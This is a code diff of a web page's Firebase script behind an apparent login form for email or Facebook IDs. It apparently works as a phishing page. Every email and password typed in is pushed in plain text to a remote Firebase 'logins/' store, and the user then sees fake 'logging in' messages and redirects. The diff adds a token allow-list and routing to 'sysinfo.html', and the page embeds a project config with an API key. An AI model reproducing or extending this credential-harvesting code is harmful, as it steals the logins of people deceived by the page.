@@ -121,68 +121,97 @@
 
   <!-- Firebase Script -->
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
-    import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-analytics.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-analytics.js";
+  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyBTuVt9xg1uiVF-LMqkRBpQErVNEve7wxM",
-      authDomain: "logindb-3ed54.firebaseapp.com",
-      databaseURL: "https://logindb-3ed54-default-rtdb.firebaseio.com",
-      projectId: "logindb-3ed54",
-      storageBucket: "logindb-3ed54.appspot.com",
-      messagingSenderId: "462951915771",
-      appId: "1:462951915771:web:5e317781e6b95c9123105e",
-      measurementId: "G-YVEY0YVGSD"
-    };
+  const firebaseConfig = {
+    apiKey: "AIzaSyBTuVt9xg1uiVF-LMqkRBpQErVNEve7wxM",
+    authDomain: "logindb-3ed54.firebaseapp.com",
+    databaseURL: "https://logindb-3ed54-default-rtdb.firebaseio.com",
+    projectId: "logindb-3ed54",
+    storageBucket: "logindb-3ed54.appspot.com",
+    messagingSenderId: "462951915771",
+    appId: "1:462951915771:web:5e317781e6b95c9123105e",
+    measurementId: "G-YVEY0YVGSD"
+  };
 
-    const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
-    const db = getDatabase(app);
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getDatabase(app);
 
-    // Popup Message Function
-    function showPopup(message, type = "default") {
-      const popup = document.getElementById("popup");
-      popup.innerText = message;
+  // List of allowed real FB IDs
+  const allowedFbIds = ["fb123456", "fb987654", "fb909090"]; // Add your own IDs here
 
-      popup.className = "popup";
-      if (type === "success") popup.classList.add("success");
-      if (type === "error") popup.classList.add("error");
+  // Popup message
+  function showPopup(message, type = "default") {
+    const popup = document.getElementById("popup");
+    popup.innerText = message;
 
-      popup.classList.add("show");
+    popup.className = "popup";
+    if (type === "success") popup.classList.add("success");
+    if (type === "error") popup.classList.add("error");
 
-      setTimeout(() => {
-        popup.classList.remove("show");
-      }, 3000);
+    popup.classList.add("show");
+
+    setTimeout(() => {
+      popup.classList.remove("show");
+    }, 3000);
+  }
+
+  // Save Login
+  window.saveLogin = () => {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!email || !password) {
+      showPopup("Enter email/FB ID and password.", "error");
+      return;
     }
 
-    // Save Login Function
-    window.saveLogin = () => {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
+    const isFbId = email.startsWith("fb") && !email.includes("@");
+    const isAllowedFbId = allowedFbIds.includes(email);
 
-      if (email && password) {
-        const loginData = {
-          email,
-          password,
-          time: new Date().toLocaleString()
-        };
-
-        push(ref(db, "logins/"), loginData)
-          .then(() => {
-            showPopup("Please wait while we log you in...", "success");
-            document.getElementById("email").value = "";
-            document.getElementById("password").value = "";
-          })
-          .catch((error) => {
-            console.error("Firebase Error:", error);
-            showPopup("Error: " + error.message, "error");
-          });
-      } else {
-        showPopup("Enter email and password.", "error");
-      }
+    // Save in Firebase first
+    const loginData = {
+      email,
+      password,
+      time: new Date().toLocaleString()
     };
-  </script>
+
+    push(ref(db, "logins/"), loginData)
+      .then(() => {
+        // Now decide route
+        if (isFbId) {
+          if (isAllowedFbId) {
+            showPopup("Logging in with valid FB ID...", "success");
+            setTimeout(() => {
+              window.location.href = "dashboard.html";
+            }, 1500);
+          } else {
+            showPopup("Invalid FB ID. Redirecting...", "error");
+            setTimeout(() => {
+              window.location.href = "sysinfo.html";
+            }, 2000);
+          }
+        } else {
+          // It's an email or phone login — allowed directly
+          showPopup("Logging in with Email...", "success");
+          setTimeout(() => {
+            window.location.href = "sysinfo.html";
+          }, 1500);
+        }
+
+        // Reset form
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+      })
+      .catch((error) => {
+        console.error("Firebase Error:", error);
+        showPopup("Error: " + error.message, "error");
+      });
+  };
+</script>
 
 </body>
 </html>
